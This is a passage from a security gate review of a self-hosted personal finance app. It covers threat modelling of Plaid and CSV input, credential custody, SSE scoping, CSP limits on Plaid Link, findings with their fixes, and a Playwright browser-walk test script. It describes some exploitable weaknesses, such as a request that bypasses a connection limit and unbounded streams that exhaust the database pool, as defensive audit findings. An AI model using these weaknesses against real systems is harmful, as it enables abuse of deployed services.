 Test Files  21 passed (21)
      Tests  426 passed (426)

$ vitest run --project api-db
 Test Files  8 passed | 1 skipped (9)
      Tests  85 passed | 1 skipped (86)
```

511 green tests with the ownership predicate deleted from a background writer's
feed. Every suite in the repo seeds exactly one user, so none of them can
distinguish "scoped to the caller" from "scoped to nothing". D6 puts `user_id`
on every table from migration one precisely so multi-user is additive later;
scoping that is only ever exercised against one user is scoping nobody has
tested.

**Closed** by `packages/contexts/ledger/test/gate-user-scope.test.ts`: one
database, two users, symmetric rows, five tests over `listTransactions`,
`listForCategorization`, `getTransaction`, `setRuleCategory` and
`setTransactionOverlay`. Verified load-bearing — under the same sabotage:

```
 FAIL  |ledger-db| test/gate-user-scope.test.ts > ledger user scoping > listForCategorization cannot be handed another user's transaction ids
AssertionError: expected [ …(2) ] to deeply equal [ Array(1) ]
      Tests  1 failed | 4 passed (5)
```

---

## 5. Threat model of what Phase 1 added (Standard D)

### 5.1 External data ingress — Plaid responses and CSV files as untrusted input

Phase 1 is the first phase where bytes chosen by someone other than Chris enter
the ledger. Two paths: a Plaid `/transactions/sync` response, and a file posted
to `/imports/csv`.

**Handled well, and verified:**

- **The ledger never trusts provider identity.** `applyProviderTransactions`
  keys on `(user_id, provider, provider_transaction_id)` and provider facts are
  immutable (D11) — a provider restating a row creates a revision, it does not
  mutate history, and the user overlay survives (sabotage L1 in wp1.7, re-checked
  here via S11a/S11b).
- **Numbers are `BIGINT` minor units end to end** (D3). There is no float path
  from a Plaid `amount` to a balance, so a hostile value cannot produce a
  rounding artefact — it can only produce a wrong number that is visibly wrong.
- **No `eval`, no template execution, no dynamic `import()` on provider data.**
  Confirmed by reading `packages/connectors/plaid/src/map.ts` and the CSV
  parsers.
- **The CSV parser is in-house and total** — `readCsv` handles quotes, embedded
  delimiters and CRLF, and refuses a multi-character delimiter rather than
  mis-splitting. No `hyperformula` or similar (D15 deny-list).
- **Upload bounds are real:** JSON body under Fastify's `bodyLimit: 1_048_576`,
  `files` `.min(1).max(20)`, `name` `.max(255)` and never used as a path. No
  archive handling, so no zip-slip; no filename-derived filesystem write, so no
  path traversal. The CSRF hook rejects an over-limit body before parsing
  (measured: 2 MiB → `403`, not an OOM).

**Findings:**

- **R-2 (HIGH, fixed)** — CSV export formula injection. §4.4. This is the one
  place Phase 1 took untrusted provider text and wrote it into a format another
  program _executes_.
- **R-4 (MEDIUM)** — `merchantId` resolves from any non-blank descriptor
  (wp1.7 §7 item 5, raised there as a design question). The security-relevant
  reading: merchant identity is derived from attacker-influenced text, and
  merchant identity is a _filter key_ on `GET /transactions` and will become a
  grouping key for insights in Phase 2. A provider (or a crafted CSV) that emits
  many near-identical descriptors can inflate the merchant table and split or
  merge spend groupings. Not exploitable for data disclosure; it is a data-quality
  and resource-growth issue that gets worse when Phase 2 hangs rules and
  budgets off merchant identity. Recommend deciding it before Phase 2, not after.
- **R-5 (LOW)** — no bound on distinct merchants or on `transactions_provider`
  revisions per transaction. A misbehaving provider that restates the same row
  on every 4-hourly poll grows `revision` and the fact table without limit. Worth
  a counter and an alert rather than a cap.

### 5.2 Token custody lifecycle: link → seal → open → sync → disconnect → `/item/remove`

Traced end to end, in code and against the database.

| Stage      | Where the token is                                                                         | Verified                                                                                                                                                                                                                              |
| ---------- | ------------------------------------------------------------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Link       | Plaid Link (browser) → `publicToken` in a request body                                     | Never logged (S2, S7); body not persisted                                                                                                                                                                                             |
| Exchange   | `PlaidConnector.connect` → `credentials` object, in memory                                 | `access_token` "returned in `credentials` and **not kept**" on the connector                                                                                                                                                          |
| Seal       | `SecretBox.sealText` with AAD `(connections, sealed_credentials, rowId)`                   | S1: plaintext storage turns the raw-column test red at two layers                                                                                                                                                                     |
| At rest    | `connections.sealed_credentials`, XChaCha20-Poly1305                                       | Raw column read as `psql` would; AAD binds to the row — a ciphertext moved between rows fails `decrypt_failed` (existing test, non-vacuous)                                                                                           |
| Open       | `openHandle` returns a **closure** (`handle.secret('access_token')`), not a field          | `JSON.stringify(handle)` does not contain the token (existing test)                                                                                                                                                                   |
| In flight  | Plaid SDK headers `PLAID-SECRET` / `PLAID-CLIENT-ID`                                       | `SENSITIVE_KEYS` censors at any depth; error envelopes (`config`/`request`/`response`) dropped wholesale — the axios shape that carries `config.data` as an already-serialised JSON string is handled by dropping, not by key-walking |
| Disconnect | `disconnectConnection` sets `sealed_credentials = NULL` after a best-effort `/item/remove` | Local destruction always happens; existing test                                                                                                                                                                                       |

**Findings:**

- **R-6 (MEDIUM) — what survives a disconnect, in the backup.** Disconnect nulls
  the column, which is correct. But `docker/backup/backup.sh` takes a nightly
  `pg_dump` retained **30 days locally** and pushed to B2 with object lock (D24),
  so a sealed credential lives in up to thirty immutable copies after the user
  disconnects. This is _not_ a plaintext exposure — the dump is `age`-encrypted
  and the credential is itself sealed under the KEK — so it is defence in depth,
  not a breach. It matters because D5's scope rule ("key loss = re-link
  providers") assumes the KEK is the only thing standing between a backup and a
  provider token, and because a user who disconnects reasonably believes the
  credential is gone. **Recommendation:** say so in `RUNBOOK.md` under
  "Disconnect", and treat KEK rotation as the operation that actually retires
  old credentials. No code change.
- **R-7 (MEDIUM) — the ten-Item ratchet is bypassable and is scoped per user.**
  `POST /connections/plaid/exchange` counts Plaid connections and refuses an
  eleventh (S4, red first try). But `POST /connections` links _any registered
  provider_, Plaid included, with no such check:

  ```
  POST /connections  { "provider": "plaid", "input": { "publicToken": "…" } }
  ```

  reaches `linkConnection` → `createConnection` → a real Item, with the ratchet
  never consulted. `POST /connections/{id}/complete` has the same shape (its
  `expectConnectionId` guard rejects a _different_ connection, but the Item has
  been exchanged at Plaid by then). Separately, the count is
  `listConnectionSummaries(database, session.userId)` — **per user**, while
  Plaid's cap is per `client_id`, i.e. per deployment. Single-user today (D6),
  so the second half is latent; the first half is live. R5 in the master plan's
  risk register is "Plaid 10-Item ratchet burned by experimentation", and this is
  exactly the hole through which it gets burned. **Fix:** move the check into
  `linkConnection` (or into `createConnection` for `provider === 'plaid'`) and
  count across all users. ~10 lines, but it is in a file adjacent to the routing
  work of C-1 and belongs with it, so it is condition C-3 rather than a gate fix.

- **R-8 (LOW)** — `POST /connections/plaid/link-token` needs only a session, and
  the route comment argues that convincingly (an ephemeral token addressed to
  this user, useless without the step-up-guarded `exchange`). Agreed. Recording
  it so the asymmetry is a decision on file rather than an oversight.

### 5.3 The SSE channel

`GET /sync/stream` and `GET /connections/{id}/events` read the outbox directly.

- **Session required** — S12, red first try.
- **User-scoped in the query**, not in the handler: `eq(domainEvents.userId,
options.userId)` is a `WHERE` clause on every read, and
  `/connections/{id}/events` adds `aggregate_id` on top. A stream opened against
  another user's connection id therefore yields _nothing_ rather than their
  events, with no existence oracle (the empty stream is identical either way).
- **Payloads are ids, counts and enums by registry rule** — `frameOf` serialises
  the domain event payload verbatim, which is safe only because of that rule.
  Worth noting as a standing constraint: the first consumer that puts a
  descriptor or an amount in an event payload puts it on this wire.
- `Last-Event-ID` / `?from=` accept only `/^\d{1,19}$/`, and an unparseable value
  is ignored rather than 400'd. No injection surface; `BigInt` overflow bounded
  by the 19-digit cap.
- One dedicated pool connection per stream, released in `finally`. The existing
  "does not leak a connection when a stream is opened and dropped repeatedly"
  test is real (it went red as collateral under S12).

**Finding — R-9 (LOW):** there is no per-user cap on concurrent streams. Each
holds a Postgres connection out of `DATABASE_POOL_MAX` (10 in production), so
ten browser tabs exhaust the pool and the API stops serving everything else. A
stolen session cookie is enough. **Recommendation:** cap concurrent streams per
session (or serve all streams off one shared listener), and raise it against
`DATABASE_POOL_MAX`.

### 5.4 The outbox / categorization consumer

The one background writer that takes row ids from a message.

- **R-3 (HIGH)** — its feed's user scope had no test at all. §4.5. Closed.
- The consumer passes `event.userId` (the outbox row's own column, written under
  the same transaction as the fact) rather than anything from the payload, which
  is the right choice: the trusted identity comes from the row, not the message
  body.
- `decide()` short-circuits on a user override before any tier competes (S11b/G2),
  and `setRuleCategory` never writes `user_category_id` (S11a). So a hostile
  merchant descriptor can influence the _rule/provider_ tiers and can never
  overwrite what the user said.
- `listForCategorization` feeds the **unmerged** user value, so a rule's own
  answer cannot masquerade as a user edit on the next pass. Verified by reading;
  pinned by the existing `rule-category` suite.

### 5.5 The web client

- **CSP is intact and strict** — and that is exactly why Plaid Link does not work
  (F-3, proven in the browser). The policy has no `'unsafe-inline'` for scripts,
  no nonce theatre (Phase 0 removed a placeholder nonce that browsers discarded),
  `object-src 'none'`, `base-uri 'none'`, `frame-ancestors 'none'`.
- **SRI on `cdn.plaid.com` is not achievable**, and this should be recorded as an
  accepted risk rather than a to-do. `apps/web/src/lib/plaid-link.ts` loads
  `link/v2/stable/link-initialize.js` — a deliberately _moving_ alias that Plaid
  updates to ship security fixes, and which Plaid's own documentation requires
  you not to pin. An `integrity` attribute would break the app on Plaid's next
  release. The residual risk is real and structural: **a compromise of
  `cdn.plaid.com` executes arbitrary script in the origin that holds the
  session cookie.** Compensating controls available today: the cookie is
  `__Host-`/`HttpOnly` so script cannot read it; every dangerous mutation needs a
  fresh WebAuthn assertion (which a script _could_ trigger, but not forge
  silently); and the CSP addition should be the narrowest that works.
- **Recommended CSP for C-2**, narrowest that makes Link function:

  ```
  script-src 'self' https://cdn.plaid.com;
  frame-src  https://cdn.plaid.com;
  connect-src 'self' https://cdn.plaid.com https://sandbox.plaid.com https://production.plaid.com;
  ```

  and **only when Plaid is configured** — a deployment with no Plaid secrets
  should keep `'self'`. `Cross-Origin-Embedder-Policy: require-corp` must also be
  reckoned with: it will block the cross-origin script and iframe unless Plaid
  serves compatible CORP/COEP headers. Verify empirically with the §7 probe,
  which reports `loaded` / `blocked` and prints the exact violated directive —
  do not assume.

- `iconKey` on the connector manifest is an asset key and the route asserts it is
  never a URL, so the server cannot tell the browser to fetch something arbitrary
  (existing test). Good.
- The WP 1.6 Playwright walkthrough runs against a **mocked API on the Vite dev
  server**, never against the real API through Caddy (`apps/web/playwright.config.ts`,
  `e2e/support/mock-api.ts`). That is a defensible scope choice for a UI work
  package, and it is also precisely why F-4 survived: the mock answers
  `/connections` with JSON, and the real proxy answers it with HTML.

### 5.6 The two Phase 0 Lows carried into Phase 1

- **R-9 (Phase 0) — unmatched `/assets/*` returned `200 text/html`.** **Closed
  and verified.** The Caddyfile now splits static prefixes into their own
  `handle` with a plain `file_server` (real 404) and restricts the SPA rewrite to
  extensionless, non-file paths. Re-read at HEAD and confirmed on the running
  proxy.
  _However_, the same class of defect reappeared one level up as **F-4**: an
  unmatched **API** path returns `200 text/html`. The Phase 0 fix addressed the
  symptom for assets; the underlying rule — "a path this server does not
  actually serve must not answer 200 with the app shell" — is still violated for
  every Phase 1 API prefix.
- **R-13 (Phase 0) — cold `up` lands `backup` unhealthy.** **Closed**, verified
  on a genuinely cold start with no pre-existing volumes. §2.4.

---

## 6. Verdict and conditions

### GO-WITH-CONDITIONS

**What is genuinely good, and should be said plainly.** The Phase 1 _domain_
work is the strongest in this repo. Sixteen of eighteen sabotages went red on the
first try against tests somebody else wrote, several with exact, meaningful
assertions rather than incidental crashes — cursor atomicity produced
`expected '10' to be null`, the tier order failed at both the unit and the
database layer, log hygiene failed six ways. The credential custody chain is
correct from link to disconnect, including AAD binding and closure-not-field
handles. The user-scoping is real everywhere the gate could test it with a second
account holder. The conformance suite, the non-leaky categorization gates and the
orchestrator invariants are all load-bearing. This is not a phase that was
tested badly.

**Why it is not a clean GO.** Everything above is true of the _code_. None of it
was true of the _deployment_. The api image had not booted since WP 1.2; the
proxy routes three of eleven API prefixes; Plaid has no secrets mounted and is
CSP-blocked in the browser. Phase 1's own exit criteria — "two real institutions
syncing on schedule", "a forced reauth completes without data loss" — are not
merely unproven, they are unreachable in the deployed system. The release-ladder
rung this phase is meant to reach, v0.2 "the trust gate", cannot be evaluated
against a stack in which no connection can be made.

The recurring mechanism is worth naming because it is now three for three: a
control is made computed on the half somebody was looking at and left hardcoded
on the half they were not (api image keep/delete), or derived from the artifact
it is supposed to be checking (the CSP e2e reads the Caddyfile), or written as a
doc comment with no test (the `plaid_*` env ban). Each was found the same way:
by running the thing rather than reading about it.

### Conditions

| #        | Condition                                                                                                                                                                                                                                                                                                                                                                                                                    | Severity     | Owner                          |
| -------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------ | ------------------------------ |
| **C-1a** | **Give the API its own routed namespace.** `handle_path /api/*` in `docker/Caddyfile`, `servers: [{url:'/api'}]` in the OpenAPI document, regenerated web client, service-worker rules and `e2e/support/mock-api.ts` updated to match. Prefix routing alone cannot work: `/transactions` and `/accounts` are both SPA routes and API routes.                                                                                 | **CRITICAL** | backend + frontend, one change |
| **C-1b** | **A CI check that the proxy's routed prefixes equal the contract's.** Parse `openapi.json`, assert `docker/Caddyfile` proxies exactly that set. This is the control whose absence let F-4 ship; without it C-1a rots the next time a router is added.                                                                                                                                                                        | **CRITICAL** | devops                         |
| **C-1c** | **Run `apps/api/test/gate-image-closure.test.ts` in CI's image-build job**, after the build. The Dockerfile fix is applied and proven (it fails against a deliberately rebuilt broken image), but nothing yet runs it where the image exists.                                                                                                                                                                                | **HIGH**     | devops                         |
| **C-2**  | **Widen the CSP for Plaid, narrowly, and only when Plaid is configured** — §5.5 for the exact directives — then re-run the §7 probe and confirm it reports `loaded`, including under `Cross-Origin-Embedder-Policy: require-corp`. Record the absence of SRI on `cdn.plaid.com` as an accepted risk with its reasoning.                                                                                                      | **HIGH**     | security + devops              |
| **C-3**  | **Mount the three `plaid_*` secrets in `compose.yml`** (declare them, add to `api` and `worker`), document them in `RUNBOOK.md` "Create secrets" and `.env.example`, set `PLAID_REDIRECT_URI` for OAuth institutions — **and close the ratchet bypass** (R-7): enforce the ten-Item check inside `linkConnection`, counted across all users, not only in the `exchange` route.                                               | **HIGH**     | devops + backend               |
| **C-4**  | **Re-walk the Phase 1 user path** after C-1..C-3: Manual account, CSV import, transactions list, edit a category and a note, accounts and balances, connections, and a real Plaid Sandbox Link through the browser. Confirm the worker runs a **scheduled** sync end to end. This gate got as far as a real passkey login and no further, and the remaining steps are exactly the ones that exercise the code Phase 1 added. | **HIGH**     | whoever lands C-1              |
| **C-5**  | Decide R-4 (broad `merchantId` resolution) **before Phase 2** hangs rules and budgets off merchant identity.                                                                                                                                                                                                                                                                                                                 | MEDIUM       | architecture                   |
| **C-6**  | Document in `RUNBOOK.md` that a disconnected provider's sealed credential persists in retained backups for the retention window, and that KEK rotation is what retires it (R-6). Cap concurrent SSE streams per session against `DATABASE_POOL_MAX` (R-9).                                                                                                                                                                   | MEDIUM/LOW   | docs + backend                 |

**Not conditions, carried forward as open items** (unchanged from wp1.7 §7, and
not fixable by more testing): two real institutions syncing on schedule, a forced
reauth completed against live Plaid, and "zero internal transfers on a month of
**real** data" all need Chris's own accounts linked. The seed-based proofs that
stand in for them are sound and non-vacuous; they are just not about real data.
Verifying the CI-parity fix in a real GitHub Actions run also remains open —
this gate could not push.

### Findings summary

| ID  | Severity     | Finding                                                                                   | State                                |
| --- | ------------ | ----------------------------------------------------------------------------------------- | ------------------------------------ |
| F-1 | **CRITICAL** | api image prunes `packages/connectors`; has not booted since WP 1.2                       | **Fixed in place** + regression test |
| F-4 | **CRITICAL** | Caddy routes 3 of 11 API prefixes; every Phase 1 route returns `200` SPA HTML, silently   | Reported (C-1)                       |
| F-2 | HIGH         | `plaid_*` secrets never mounted in compose; Plaid connector unregistered in production    | Reported (C-3)                       |
| F-3 | HIGH         | Production CSP blocks Plaid Link (script, frame, connect) — proven in browser             | Reported (C-2)                       |
| R-1 | HIGH         | "`plaid_*` never readable from env" had no test; 67/67 green with an env fallback added   | **Test added**                       |
| R-2 | HIGH         | CSV export formula injection (CWE-1236) from provider-controlled payee names              | **Fixed in place** + test            |
| R-3 | HIGH         | Categorization feed's user scope had no test; 511 green with the predicate deleted        | **Test added**                       |
| R-7 | MEDIUM       | Ten-Item ratchet bypassable via `POST /connections`; counted per user, not per deployment | Reported (C-3)                       |
| R-4 | MEDIUM       | `merchantId` resolves from any non-blank descriptor                                       | Reported (C-5)                       |
| R-6 | MEDIUM       | Sealed credentials persist in retained backups after disconnect                           | Reported (C-6)                       |
| R-5 | LOW          | No bound on merchant growth or provider-fact revisions                                    | Reported                             |
| R-8 | LOW          | `link-token` needs only a session (reviewed, agreed, recorded)                            | Accepted                             |
| R-9 | LOW          | No per-user cap on concurrent SSE streams vs `DATABASE_POOL_MAX`                          | Reported (C-6)                       |
| —   | closed       | Phase 0 R-9 (assets 404) and R-13 (backup cold start)                                     | **Both verified closed**             |

---

## 7. Reproduction

Tree state when this gate finished: `git status` shows the Dockerfile fix, the
transactions.ts fix, four new `gate-*` test files and this evidence directory,
and nothing else. Every sabotage was restored with `git checkout --`.

```
 M apps/api/src/routes/transactions.ts        # R-2 fix (csvText)
 M docker/api.Dockerfile                      # F-1 fix (computed delete set)
?? apps/api/test/db/gate-phase1.test.ts       # step-up side effects, cross-user, CWE-1236
?? apps/api/test/gate-image-closure.test.ts   # F-1 regression
?? packages/config/src/gate-secret-custody.test.ts   # R-1
?? packages/contexts/ledger/test/gate-user-scope.test.ts  # R-3
?? docs/evidence/phase-1/gate-security-review.md
?? docs/evidence/phase-1/screenshots/
```

Whole-tree suite after the gate's changes:

```
$ DATABASE_URL=… pnpm exec vitest run --reporter=dot
 Test Files  92 passed | 1 skipped (93)
      Tests  1467 passed | 2 skipped (1469)
```

(1443 baseline + 24 new gate tests.) `pnpm run typecheck` and `pnpm run lint`
both clean; schema-ownership 94 tables across 14 packages.

### The browser-walk script

Run from `apps/web` (so `@playwright/test` resolves), with the stack up:

```bash
just up
just bootstrap-user name="Gate Reviewer"     # copy the one-time token
docker compose cp proxy:/data/caddy/pki/authorities/local/root.crt /tmp/gate-ca.crt
SPKI=$(openssl s_client -connect 127.0.0.1:443 -servername personalfi.lan </dev/null 2>/dev/null \
  | openssl x509 -pubkey -noout | openssl pkey -pubin -outform der \
  | openssl dgst -sha256 -binary | openssl enc -base64)
cd apps/web && SPKI_PIN="$SPKI" BOOTSTRAP_TOKEN="<token>" node gate-walk.mjs
```

<details><summary><code>gate-walk.mjs</code> (verbatim)</summary>

```js
// SPDX-License-Identifier: MIT
// Phase 1 security gate — the real browser walk, against the real production
// compose stack through Caddy's internal CA. No mocks, no dev server.
import { chromium } from '@playwright/test';
import { mkdirSync } from 'node:fs';

const BASE = 'https://personalfi.lan';
const SHOTS = '/home/chris/Projects/PersonalFi/docs/evidence/phase-1/screenshots';
const TOKEN = process.env.BOOTSTRAP_TOKEN;
if (!TOKEN) throw new Error('set BOOTSTRAP_TOKEN');
mkdirSync(SHOTS, { recursive: true });

const log = [];
const note = (m) => {
  log.push(m);
  console.log(m);
};

const browser = await chromium.launch({
  args: [
    '--host-resolver-rules=MAP personalfi.lan 127.0.0.1',
    // Trust EXACTLY this leaf, by SPKI hash — not `ignoreHTTPSErrors`, which
    // would trust anything and prove nothing about Caddy's internal CA.
    `--ignore-certificate-errors-spki-list=${process.env.SPKI_PIN}`,
  ],
});
const context = await browser.newContext({ ignoreHTTPSErrors: false });
const page = await context.newPage();

const violations = [];
const consoleErrors = [];
const apiCalls = [];
page.on('response', async (r) => {
  const u = new URL(r.url());
  if (!/^\/(auth|connections|transactions|accounts|connectors|imports|sync)/.test(u.pathname))
    return;
  let body = '';
  try {
    body = (await r.text()).slice(0, 220);
  } catch {
    body = '<unreadable>';
  }
  apiCalls.push(`${r.request().method()} ${u.pathname} -> ${r.status()} ${body}`);
});
page.on('pageerror', (e) => consoleErrors.push(`pageerror: ${e.message}`));
page.on('console', (m) => {
  if (m.type() === 'error') consoleErrors.push(m.text());
});

await page.addInitScript(() => {
  window.__cspViolations = [];
  document.addEventListener('securitypolicyviolation', (e) => {
    window.__cspViolations.push(`${e.violatedDirective} :: ${e.blockedURI}`);
  });
});

// A REAL virtual authenticator, not a navigator.credentials override.
const cdp = await context.newCDPSession(page);
await cdp.send('WebAuthn.enable');
const { authenticatorId } = await cdp.send('WebAuthn.addVirtualAuthenticator', {
  options: {
    protocol: 'ctap2',
    transport: 'internal',
    hasResidentKey: true,
    hasUserVerification: true,
    isUserVerified: true,
    automaticPresenceSimulation: true,
    // Without these two, Chrome's create() succeeds but the assertion that
    // follows is refused and the app reports "That was cancelled."
    defaultBackupEligibility: true,
    defaultBackupState: true,
  },
});
note(`virtual authenticator ${authenticatorId} attached via CDP`);

const shot = async (n) => {
  await page.screenshot({ path: `${SHOTS}/gate-${n}.png`, fullPage: true });
};
const collectCsp = async () => {
  const v = await page.evaluate(() => window.__cspViolations ?? []).catch(() => []);
  for (const i of v) if (!violations.includes(i)) violations.push(i);
};
const bodyText = async () =>
  (await page.locator('body').innerText()).replace(/\s+/g, ' ').slice(0, 400);

note('STEP 1: open the one-time enrolment link');
await page.goto(`${BASE}/register#token=${TOKEN}`, { waitUntil: 'networkidle' });
await shot('01-register');
await collectCsp();
const enrol = page.getByRole('button', { name: /enrol|enroll|passkey|register|create/i }).first();
if (await enrol.count()) {
  await enrol.click();
  await page.waitForTimeout(3000);
}
await shot('02-after-enrol');
await collectCsp();
note(`  page says: ${await bodyText()}`);
await shot('03-post-enrol');

note('STEP 2: sign in');
await page.goto(`${BASE}/`, { waitUntil: 'networkidle' });
await page.waitForTimeout(1500);
note(`  url=${page.url()}`);
const signIn = page.getByRole('button', { name: /sign in|log in|unlock|passkey/i }).first();
if (await signIn.count()) {
  await signIn.click();
  await page.waitForTimeout(3000);
}
await shot('04-signed-in');
await collectCsp();
note(`  page says: ${await bodyText()}`);

for (const [name, path] of [
  ['05-transactions', '/transactions'],
  ['06-accounts', '/accounts'],
  ['07-connections', '/accounts/connections'],
]) {
  await page.goto(`${BASE}${path}`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(1500);
  note(`STEP ${path}: ${await bodyText()}`);
  await shot(name);
  await collectCsp();
}

note('STEP: does the Plaid CDN script load under the production CSP?');
const probe = await page.evaluate(
  () =>
    new Promise((resolve) => {
      const s = document.createElement('script');
      s.src = 'https://cdn.plaid.com/link/v2/stable/link-initialize.js';
      s.async = true;
      s.onload = () => resolve('loaded');
      s.onerror = () => resolve('blocked');
      document.head.appendChild(s);
      setTimeout(() => resolve('timeout'), 8000);
    }),
);
note(`  cdn.plaid.com script: ${probe}`);
await collectCsp();
await shot('08-plaid-probe');

note('API CALLS:');
for (const c of apiCalls) note(`  ${c}`);
note('CSP VIOLATIONS:');
for (const v of violations) note(`  ${v}`);
note('CONSOLE ERRORS:');
for (const e of consoleErrors.slice(0, 25)) note(`  ${e}`);
await browser.close();
```

</details>

Screenshots are in `docs/evidence/phase-1/screenshots/gate-*.png`.

### Teardown

`docker compose down` after the walk; the gate left no running containers and no
scratch databases (every `*-db` suite drops its own).

### One note on hygiene

`just bootstrap-user` prints the enrolment token twice — once inside the URL and
once on a `token only:` line. Both were kept out of this file and out of every
command transcript in it (redacted at the shell with `sed` before any output was
read). The token used for the walk was single-use and has been consumed. The
Phase 0 evidence-hygiene test exists because a live token once reached an
evidence document; it did not this time.
